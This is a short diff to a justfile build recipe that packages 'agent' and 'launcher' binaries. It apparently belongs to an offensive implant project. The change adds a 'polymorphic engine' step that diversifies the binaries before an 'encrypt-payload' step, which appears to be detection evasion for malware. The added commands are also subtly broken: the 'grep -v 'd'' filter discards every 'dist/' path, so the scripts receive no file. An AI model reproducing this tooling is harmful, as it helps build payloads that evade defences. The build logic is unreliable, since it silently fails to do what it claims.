@@ -33,7 +33,15 @@ package-all TARGET=default_target KEY="":
     # Locate the built agent binary (extension differs per target).
     @cp target/{{TARGET}}/release/agent* dist/ 2>/dev/null || true
     @cp target/{{TARGET}}/release/launcher* dist/ 2>/dev/null || true
-    just encrypt-payload $(ls dist/agent* | head -n1) {{KEY}}
+    
+    # ----------------------------------------------------
+    # Apply Polymorphic Engine and Compile-Time Adjustments (FR-4 & FR-6)
+    # ----------------------------------------------------
+    @echo "[+] Running morphological engine over raw binaries..."
+    -python3 orchestrate_diversify.py $(ls dist/agent* | head -n1 | grep -v 'd') || echo "Skipped agent diversification"
+    -python3 orchestrate_diversify.py $(ls dist/launcher* | head -n1 | grep -v 'd') || echo "Skipped launcher diversification"
+    
+    just encrypt-payload $(ls dist/agent* | head -n1 | grep -v 'd') {{KEY}}
     @echo "dist/ contents:" && ls -lh dist/
 
 # Run the full workspace test suite (host platform).
